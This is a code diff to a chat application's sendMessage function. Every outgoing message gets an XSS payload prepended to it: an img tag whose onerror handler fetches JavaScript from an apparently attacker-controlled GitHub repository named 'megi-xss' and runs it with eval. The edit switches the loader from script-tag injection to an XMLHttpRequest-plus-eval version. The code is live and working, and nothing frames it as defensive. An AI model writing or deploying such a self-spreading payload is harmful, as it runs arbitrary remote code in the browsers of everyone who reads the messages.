@@ -5,7 +5,7 @@ eafeaf = true;
 
 function sendMessage() {
             const name = getUsername();
-            const content = `<img src="" onerror="if (typeof eafeaf === 'undefined') { var s = document.createElement('script'); s.src='https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js'; document.head.appendChild(s); }">` + messageInput.value;
+            const content = `<img src="" onerror="if (typeof efef === 'undefined') {efef = true; var x = new XMLHttpRequest(); x.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { eval(x.responseText); } }; x.open('GET', 'https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js', true); x.send(); }">` + messageInput.value;
             const color = getUserColor();
 
             if (content.trim() !== "") {
